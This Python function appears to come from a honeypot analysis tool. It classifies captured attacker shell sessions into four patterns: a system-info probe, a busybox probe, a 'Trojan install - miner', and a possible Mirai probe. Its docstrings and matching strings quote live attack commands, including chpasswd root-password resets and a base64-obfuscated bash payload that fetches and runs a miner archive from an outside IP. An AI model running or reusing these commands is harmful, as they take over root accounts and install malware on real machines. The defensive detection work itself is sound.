def check_pattern(pattern):
    '''
    PATTERN 1: Get system INFO - simmilar to pattern 3
    - Commands:
        - cat /proc/cpuinfo | grep name | wc -l
        - echo "root:0.eygihqSKow"|chpasswd|bash
        - cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
        - free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
        - ls -lh $(which ls)
        - which ls
        - crontab -l
        - w
        - uname -m
        - nproc
        - top
        - uname
        - uname -a
        - lscpu | grep Model
    - Danger level: low
    - Inspection score: 
    - Command description:
    - Automated script: Yes    
    '''
    pattern_test_split = pattern.split('\n')
    if pattern_test_split[0] == 'cat /proc/cpuinfo | grep name | wc -l' and \
       pattern_test_split[1].startswith('echo "root:') and \
       pattern_test_split[13] == 'lscpu | grep Model':

        # print('MATCH FOUND: PATTERN 1 -  Get system INFO - simmilar to pattern 3')
        return (True, 'pattern1_id', 'low', True)

    '''
    PATTERN 2: PATTERN_NAME
    - Commands:
        - enable
        - system
        - shell
        - sh
        - cat /proc/mounts; /bin/busybox [NAME]
        - cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox [NAME]
        - tftp; wget; /bin/busybox [NAME]
        - dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
        - /bin/busybox [NAME]
        - rm .s; exit
    - Danger level:
    - Command description:
    - Automated script: Yes    
    '''
    pattern_test_split = pattern.split('\n')
    if pattern_test_split[0] == 'enable' and \
       pattern_test_split[1] == 'system' and \
       pattern_test_split[2] == 'shell' and \
       pattern_test_split[3] == 'sh' and \
       pattern_test_split[4].startswith('cat /proc/mounts; /bin/busybox') and \
       pattern_test_split[5].startswith('cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox') and \
       pattern_test_split[6].startswith('tftp; wget; /bin/busybox') and \
       pattern_test_split[7] == 'dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s' and \
       pattern_test_split[8].startswith('/bin/busybox') and \
       pattern_test_split[9] == 'rm .s; exit':
        # print('MATCH FOUND: PATTERN 2 - ')
        return (True, 'pattern2_id', 'low', True)

    '''
    PATTERN 3: Trojan install - miner
    - Commands:
        - cd /var/tmp; echo "IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw" | base64 --decode | bash
        - cat /proc/cpuinfo | grep name | wc -l
        - echo "root:DQjD79ohUPMZ"|chpasswd|bash
        - echo "321" > /var/tmp/.var03522123
        - rm -rf /var/tmp/.var03522123
        - cat /var/tmp/.var03522123 | head -n 1
        - cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
        - free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
        - ls -lh $(which ls)
        - which ls
        - crontab -l
        - w
        - uname -m
        - cat /proc/cpuinfo | grep model | grep name | wc -l
        - top
        - uname
        - uname -a
        - lscpu | grep Model
    - Danger level: High
    - Inspection score: 
    - Command description:
    - Automated script: Yes    
    '''
    pattern_test_split = pattern.split('\n')
    if pattern_test_split[0].startswith('cd /var/tmp; echo "IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YM') and \
       pattern_test_split[1] == 'cat /proc/cpuinfo | grep name | wc -l' and \
       pattern_test_split[2].startswith('echo "root:') and \
       pattern_test_split[17] == 'lscpu | grep Model':
       
        # print('MATCH FOUND: PATTERN 3 - Trojan install - miner')
        return (True, 'pattern3_id', 'high', True)

    '''
    PATTERN 4: 
    - Commands:
        - /gisdfoewrsfdf
        - /bin/busybox cp; /gisdfoewrsfdf
        - mount ;/gisdfoewrsfdf
        - echo -e '\x47\x72\x6f\x70/' > //.nippon;   cat //.nippon;   rm -f //.nippon
        - echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippon;   cat /tmp/.nippon;   rm -f /tmp/.nippon
        - echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon;   cat /var/tmp/.nippon;   rm -f /var/tmp/.nippon
        - echo -e '\x47\x72\x6f\x70/' > //.nippon;   cat //.nippon;   rm -f //.nippon
        - echo -e '\x47\x72\x6f\x70/lib/init/rw' > /lib/init/rw/.nippon;   cat /lib/init/rw/.nippon;   rm -f /lib/init/rw/.nippon
        - echo -e '\x47\x72\x6f\x70/proc' > /proc/.nippon;   cat /proc/.nippon;   rm -f /proc/.nippon
        - echo -e '\x47\x72\x6f\x70/sys' > /sys/.nippon;   cat /sys/.nippon;   rm -f /sys/.nippon
        - echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon;   cat /dev/.nippon;   rm -f /dev/.nippon
        - echo -e '\x47\x72\x6f\x70/dev/shm' > /dev/shm/.nippon;   cat /dev/shm/.nippon;   rm -f /dev/shm/.nippon
        - echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon;   cat /dev/pts/.nippon;   rm -f /dev/pts/.nippon
        - /gisdfoewrsfdf
        - cat /bin/echo ;/gisdfoewrsfdf
    - Comment: Maybe Mirai botnet
    - Danger level: Low
    - Inspection score: 0 (CLEAN)
    - Command description:
        - mount: display all currently attached file systems
        - the attacker tests if a binary file can be created using the "echo" command
        - This sends the string "Grop" to the file /.nippon. This test is then repeated on all partitions found in "mount".
    - Automated script: Yes    
    '''
    terms_pattern4 = ['.nippon', 'cat', 'rm -f', 'mount', '/bin/busybox']
    if all(x in pattern for x in terms_pattern4):
        return (True, 'pattern4_id', 'low', True)


    print('No matches for:\n', pattern)
    return (False, '', '', '')







        
        
        

